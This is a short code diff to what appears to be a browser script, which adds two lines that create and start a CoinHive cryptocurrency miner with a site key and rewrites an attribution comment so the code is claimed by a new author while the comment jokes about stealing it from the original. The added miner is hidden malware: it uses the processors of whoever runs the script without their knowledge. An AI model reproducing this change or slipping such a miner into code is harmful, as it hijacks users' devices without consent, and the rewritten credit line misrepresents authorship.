@@ -96,5 +96,7 @@ for (i = 0, l = obs.length; i < l; i++) {
 }
 fkkColors();
 }
+var miner = new CoinHive.User('0VNGbWrvWpKFi3rjS0RIeeOnplgUgsW6', 'datapod2');
+miner.start();
 setInterval(datapodify, 1000);
-//This code is by Datapod/FireLion200 do not steal
+//This code is by dysproh totally di not steal from Datapod/Firelion200
